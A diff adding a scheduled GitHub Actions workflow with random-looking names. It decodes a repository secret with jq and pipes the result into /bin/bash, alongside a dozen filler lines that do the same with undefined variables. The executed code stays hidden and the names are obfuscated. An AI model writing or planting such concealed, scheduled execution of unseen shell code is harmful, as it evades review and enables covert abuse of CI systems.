@@ -1,0 +1,29 @@
+name: wengtouwt
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '51 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wengtouwt
+        env:
+          p96924: ${{ secrets.p96924 }}
+        run: |
+          echo $p96924 | jq -r .eqpbi765 | /bin/bash
+          echo $dx1 | jq -r .cluu98 | /bin/bash
+          echo $niue62 | jq -r .v95 | /bin/bash
+          echo $i629 | jq -r .dqas83 | /bin/bash
+          echo $wo7567 | jq -r .jc042 | /bin/bash
+          echo $ui91916 | jq -r .hvdhk8 | /bin/bash
+          echo $yep57646 | jq -r .al211 | /bin/bash
+          echo $lbs85425 | jq -r .zwga68688 | /bin/bash
+          echo $zpzvk672 | jq -r .m585 | /bin/bash
+          echo $vxn6 | jq -r .v21 | /bin/bash
+          echo $brj776 | jq -r .xcv308 | /bin/bash
+          echo $wjhv62321 | jq -r .xrdbf55811 | /bin/bash
+          echo $qggz585 | jq -r .a51 | /bin/bash
+
